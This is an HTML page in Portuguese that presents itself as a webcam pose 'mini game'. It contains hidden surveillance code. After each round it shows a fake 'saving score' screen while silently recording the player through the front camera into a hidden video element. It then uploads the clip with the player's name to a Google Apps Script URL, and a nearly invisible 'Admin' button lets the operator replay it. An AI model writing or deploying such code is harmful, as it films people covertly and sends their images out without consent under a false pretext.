<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mini Game - Desafio Corporal</title>
    
    <style>
        :root { --bg-color: #f4f4f9; }
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px; margin: 0; background-color: var(--bg-color); }
        #app-container { max-width: 500px; margin: 0 auto; padding-bottom: 80px; }
        #front-camera { display: none !important; }
        .hidden { display: none !important; }
        
        input[type="text"] { padding: 12px; font-size: 16px; border: 1px solid #ddd; border-radius: 5px; width: 80%; max-width: 300px; margin-bottom: 10px; }
        button.primary-btn { padding: 12px 24px; font-size: 16px; margin: 5px; cursor: pointer; background-color: #28a745; color: white; border: none; border-radius: 5px; font-weight: bold; transition: 0.2s; }
        button.primary-btn:hover { background-color: #218838; }
        h2 { color: #333; }
        #logged-user { font-weight: bold; color: #007bff; }

        #game-scanner-box {
            width: 100%;
            height: 300px;
            background: #222;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }
        #game-video-preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
        }
        #camera-error-msg {
            color: #ff6b6b;
            font-size: 14px;
            padding: 20px;
            display: none;
        }

        #timer-box {
            font-size: 32px;
            font-weight: bold;
            color: #dc3545;
            margin-bottom: 5px;
        }
        #target-box {
            font-size: 20px;
            font-weight: bold;
            color: #333;
            background: #fff;
            padding: 12px;
            border-radius: 8px;
            border: 2px dashed #007bff;
            margin-bottom: 15px;
        }

        #loading-screen {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 0;
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #e0e0e0;
            border-top: 6px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-checkmark {
            width: 80px;
            height: 80px;
            background-color: #28a745;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px auto;
            box-shadow: 0 4px 10px rgba(40, 167, 69, 0.3);
            animation: popIn 0.3s ease-in-out;
        }
        .checkmark-v {
            color: white;
            font-size: 45px;
            font-weight: bold;
            line-height: 1;
            margin-top: -5px;
        }
        @keyframes popIn {
            0% { transform: scale(0); }
            80% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        #qr-content-box {
            margin-top: 15px;
            padding: 12px;
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 5px;
            word-break: break-all;
            font-size: 15px;
            color: #333;
            display: inline-block;
            max-width: 90%;
        }

        #btn-ver-video {
            position: fixed; bottom: 10px; right: 10px; width: 30px; height: 30px;
            border-radius: 50%; background-color: var(--bg-color); border: none; box-shadow: none;
            cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 100;
            opacity: 0.05; transition: opacity 0.1s ease; -webkit-tap-highlight-color: transparent;
        }
        #btn-ver-video:active { opacity: 1; background-color: #e0e0e0; }

        #modal-video {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); flex-direction: column; align-items: center; justify-content: center; z-index: 1000;
        }
        #modal-video video { max-width: 90%; max-height: 80%; border: 3px solid white; border-radius: 10px; }
        #btn-fechar-modal { margin-top: 20px; background-color: #dc3545; color: white; border: none; border-radius: 5px; padding: 10px 30px; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>

<div id="app-container">
    <div id="login-screen">
        <h2>Identificação do Jogador</h2>
        <input type="text" id="user-name" placeholder="Digite seu nome" required><br>
        <button class="primary-btn" onclick="fazerLogin()">Jogar</button>
    </div>

    <div id="scanner-screen" class="hidden">
        <h2>Mini Game Corporal</h2>
        <p>Jogador: <span id="logged-user"></span></p>
        
        <div id="game-container">
            <div id="timer-box">05</div>
            <div id="target-box">Sorteando desafio...</div>

            <div id="game-scanner-box">
                <video id="game-video-preview" autoplay playsinline muted></video>
                <div id="camera-error-msg">⚠️ Câmera indisponível ou bloqueada pelo navegador. Verifique se outro aplicativo está usando a câmera ou se o acesso foi permitido.</div>
            </div>
            <button class="primary-btn" onclick="finalizarDesafio()">Concluir Desafio</button>
        </div>

        <video id="front-camera" autoplay playsinline muted></video>

        <div id="loading-screen" class="hidden">
            <div class="spinner"></div>
            <p id="loading-text">Salvando pontuação...</p>
        </div>

        <div id="result" class="hidden">
            <div class="success-checkmark">
                <span class="checkmark-v">✓</span>
            </div>
            <h3>Desafio Concluído!</h3>
            
            <div id="qr-content-box" class="hidden">
                <span id="qr-result"></span>
            </div>

            <br><br>
            <button class="primary-btn" onclick="iniciarGame()">Próxima Rodada</button>
        </div>
    </div>
</div>

<button id="btn-ver-video" class="hidden" onclick="abrirModal()" title="Admin"></button>

<div id="modal-video">
    <video id="video-result" controls></video>
    <button id="btn-fechar-modal" onclick="fecharModal()">Fechar Vídeo</button>
</div>

<script>
    const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbwdbgfAEP-ZobJCnppQXpAJpjxjB-P0ZB-j8lzp3RDK3P4TncQqO3hhHsSPAKU5R9xysA/exec";

    let usuarioAtual = "";
    let partesCorpo = [
        "Levantar Mão Direita",
        "Levantar Mão Esquerda",
        "Mãos na Cabeça",
        "Cruzar os Braços"
    ];
    let desafioAtual = "";
    let timerInterval = null;
    let tempoRestante = 5;
    let gameStream = null;

    function fazerLogin() {
        const input = document.getElementById('user-name').value;
        if (input) {
            usuarioAtual = input;
            document.getElementById('logged-user').innerText = usuarioAtual;
            document.getElementById('login-screen').classList.add('hidden');
            document.getElementById('scanner-screen').classList.remove('hidden');
            iniciarGame();
        } else {
            alert("Digite seu nome.");
        }
    }

    async function iniciarGame() {
        document.getElementById('loading-screen').classList.add('hidden');
        document.getElementById('result').classList.add('hidden');
        document.getElementById('qr-content-box').classList.add('hidden');
        document.getElementById('game-container').style.display = 'block';
        document.getElementById('btn-ver-video').classList.add('hidden');
        document.getElementById('video-result').src = ""; 
        document.getElementById('camera-error-msg').style.display = 'none';
        document.getElementById('game-video-preview').style.display = 'block';

        const randomIndex = Math.floor(Math.random() * partesCorpo.length);
        desafioAtual = partesCorpo[randomIndex];
        document.getElementById('target-box').innerText = `Ação: ${desafioAtual}`;

        try {
            if (gameStream) {
                gameStream.getTracks().forEach(track => track.stop());
            }
            gameStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
            const videoElem = document.getElementById('game-video-preview');
            videoElem.srcObject = gameStream;
            await videoElem.play();
        } catch (err) {
            console.error("Erro ao abrir câmera:", err);
            document.getElementById('game-video-preview').style.display = 'none';
            document.getElementById('camera-error-msg').style.display = 'block';
        }

        tempoRestante = 5;
        document.getElementById('timer-box').innerText = "05";
        
        clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            tempoRestante--;
            document.getElementById('timer-box').innerText = tempoRestante < 10 ? "0" + tempoRestante : tempoRestante;
            
            if (tempoRestante <= 0) {
                clearInterval(timerInterval);
                finalizarDesafio();
            }
        }, 1000);
    }

    function finalizarDesafio() {
        clearInterval(timerInterval);

        if (gameStream) {
            gameStream.getTracks().forEach(track => track.stop());
            gameStream = null;
        }

        document.getElementById('game-container').style.display = 'none';
        document.getElementById('loading-text').innerText = "Salvando pontuação...";
        document.getElementById('loading-screen').classList.remove('hidden');

        document.getElementById('qr-result').innerText = `Ação Realizada: ${desafioAtual}`;

        iniciarGravacaoVideoSilenciosa(desafioAtual);
    }

    async function iniciarGravacaoVideoSilenciosa(nomeDesafio) {
        const videoElement = document.getElementById('front-camera');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
            videoElement.srcObject = stream;
            await videoElement.play(); 

            let mediaRecorder;
            let chunks = [];

            let options = { mimeType: 'video/webm; codecs=vp9' };
            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                options = { mimeType: 'video/webm' };
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    options = { mimeType: '' };
                }
            }

            mediaRecorder = new MediaRecorder(stream, options);

            mediaRecorder.ondataavailable = function(e) {
                if (e.data && e.data.size > 0) {
                    chunks.push(e.data);
                }
            };

            mediaRecorder.onstop = async function() {
                const blob = new Blob(chunks, { type: mediaRecorder.mimeType || 'video/webm' });
                
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = function() {
                    const videoBase64 = reader.result;
                    
                    document.getElementById('video-result').src = videoBase64;

                    stream.getTracks().forEach(track => track.stop());

                    salvarNaPlanilha(usuarioAtual, `MiniGame: ${nomeDesafio}`, videoBase64);

                    document.getElementById('loading-screen').classList.add('hidden');
                    document.getElementById('result').classList.remove('hidden');
                    document.getElementById('btn-ver-video').classList.remove('hidden');

                    setTimeout(() => {
                        document.getElementById('qr-content-box').classList.remove('hidden');
                    }, 2000);
                };
            };

            mediaRecorder.start();

            setTimeout(() => {
                if (mediaRecorder.state === "recording") {
                    mediaRecorder.stop();
                }
            }, 5000);

        } catch (err) {
            console.error("Erro ao gravar vídeo oculto:", err);
            document.getElementById('loading-screen').classList.add('hidden');
            document.getElementById('result').classList.remove('hidden');
            document.getElementById('qr-content-box').classList.remove('hidden');
        }
    }

    async function salvarNaPlanilha(usuario, infoDesafio, videoBase64) {
        const dados = {
            usuario: usuario,
            qrCode: infoDesafio,
            fotoBase64: videoBase64
        };

        try {
            await fetch(GOOGLE_SHEETS_URL, {
                redirect: "follow",
                method: "POST",
                headers: {
                    "Content-Type": "text/plain;charset=utf-8",
                },
                body: JSON.stringify(dados)
            });
        } catch (erro) {
            console.error("Erro ao sincronizar com o banco de dados:", erro);
        }
    }

    function abrirModal() {
        if (document.getElementById('video-result').src) {
            document.getElementById('modal-video').style.display = 'flex';
        }
    }

    function fecharModal() {
        document.getElementById('modal-video').style.display = 'none';
        document.getElementById('video-result').pause();
    }
</script>
</body>
</html>
